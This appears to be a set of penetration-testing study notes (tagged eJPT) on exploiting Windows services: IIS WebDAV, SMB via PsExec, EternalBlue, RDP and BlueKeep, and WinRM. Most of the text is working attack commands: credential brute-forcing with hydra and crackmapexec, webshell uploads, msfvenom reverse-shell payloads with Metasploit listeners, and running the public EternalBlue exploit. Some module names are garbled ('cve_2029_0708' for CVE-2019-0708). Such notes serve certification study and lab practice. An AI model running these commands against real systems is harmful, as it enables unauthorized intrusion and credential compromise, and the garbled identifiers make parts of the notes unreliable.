s# 16 Exploiting Windows Vulnerabilities

# Microsoft IIS WebDAV

- IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
- It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites.
- IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.
- Typically configured to run on ports 80/443.
- Supported executable file extensions:
	- .asp
	+ .aspx
	+ .config
	+ .php

## WebDAV

- WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
- WebDAV essentially enables a web server to function as a file server for collaborative authoring.
- WebDAV runs on top Microsoft IIS on ports 80/443.
- In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.
## Exploitation

- The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server.
- We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication.
- After obtaining legitimate credentials, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.

## Tools

- **davtest** - Used to scan, authenticate and exploit a WebDAV server.
- **cadaver** - cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers.

## Example

```bash
nmap -sV -sC <IP>
nmap -sV -p 80 --script=http-enum <IP>
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <IP> http-get /webdav/
davtest -url http://<IP>/webdav
davtest -auth user:password -url http://<IP>/webdav
cadaver http://<IP>/webdav
cadaver put /usr/share/webshells/asp/webshell.asp
```

## Exploiting WebDav with Metasploit

Generating payload with *msfvenom* and upload it with *cadaver*

```shell
nmap -sV -p 80 --script=http-enum <IP>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<MY-IP> LPORT=<MY-PORT> -f asp > shell.asp
cadaver http://<IP>/webdav
	put /root/shell.asp
service postgresql start
msfconsole
msf6: use multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST <MY-IP>
	set LPORT <MY-PORT>
	run
meterpreter
	sysinfo
	getuid
	delete shell.asp

msf6: search iis upload
	exploit(windows/iis/iis_webdav_upload_asp)
	set HttpUsername
	set HttpPassword
	set PATH /webdav/metasploit.asp
	run
meterpreter
	sysinfo
	getuid
```

# SMB With PsExec

Two levels of authentication:
- User Authentication (user provide username:password)
- Share Authentication (user provide password)

	1. **Client:**  Authentication Request
	2. **Server:** Encrypt string with user's hash
	3. **Client:** Encrypted string
	4. **Server:** Access Granted

## PsExec

- Allow execute processes on remote Windows systems using any user's credentials
- Authentication is performed via SMB
- We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt
- It's similar to RDP, but commands are sent via CMD

## Exploitation

- Identify legitimate user account and their respective passwords or password hashes
- Most common technique will involve performing and SMB login brute-force attack
- We can narrow down our brute-force attack to only include common Windows user account like:
	- Administrator
- Now we can use the credential to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell

```shell
nmap -sV -sC <IP>
service postgresql start
msfconsole
	auxiliary(scanner/smb/smb_login)
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_user.txt
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	set RHOSTS <IP>
	exploit(windows/smb/psexec)
	set SMBUser Administrator
	set SMBPass <PASSWORD>
```

# Windows MS17-010 SMB Vulnerability (EternalBlue)

###### Tool: [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

#### Demo
Manual:
```bash
nmap -sV -p 445 -O <IP>
nmap -sV -p 445 â€”script=smb-vuln-ms17-010 <ip>
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
pip install -r requirements.txt
cd <path>/AutoBlue-MS17-010/shellcode
chmod +x shell_prep.sh
./shell_prep.sh
	y
	<my-ip>
	<my-port>
	<my-port>
	1
	1
nc -nvlp <my-port> (on new shell)
chmod +x eternalblue_exploit7.py
python eternalblue_exploit7.py <ip-target> shellcode/sc_x64.bin
```

Automatic:

```bash
search eternalblue (auxiliary and exploit)
```

# RDP

- Authentication requires a legitimate user account and password in clear-text

## Exploiting

```shell
nmap -sV -p- <IP>
msf6 auxiliary(scanner/rdp/rdp_scanner)
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.20.46 -s 3333
xfreerdp /u:<USER> /p:<PASSWORD> /v:<IP>:><PORT>
```

# RDP Vulnerability CVE-2019-0708 (BlueKeep)

- Allow attackers to **gain access to a chunk of kernel memory** consequently allowing to remotely execute arbitrary code at the system level without authentication.

## Exploit

```shell
msf6: auxiliary(scanner/rdp/cve_2029_0708_bluekeep)
msf6: exploit(windows/rdp/cve_2029_0708_bluekeep_rce) (works only x64)
	show targets
```

# WinRM

TCP port 5985 and 5986 (HTTPS)

Tipically used:
- Remotely access and interact with Windows hosts on a local network
- Remotely access and execute commands on Windows systems
- Manage and configure Windows systems remotely

Authentication:
- username:password
- username:passwordhash 

Tool:
- crackmapexec (brute-force)
- evil-winrm (ruby script, obtain command shell session)

## Exploit

```shell
crackmapexec winrm <IP> -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_password.txt
crackmapexec wintm <IP> -u administrator -p <PASSWORD> -x "command-here"

evil-winrm -u administrator -p '<password>' -i <IP>

msf6: auxiliary(scanner/winrm/winrm_login)
msf6: exploit(windows/winrm/winrm_script_exec)
```

#eJPT #cybersecurity 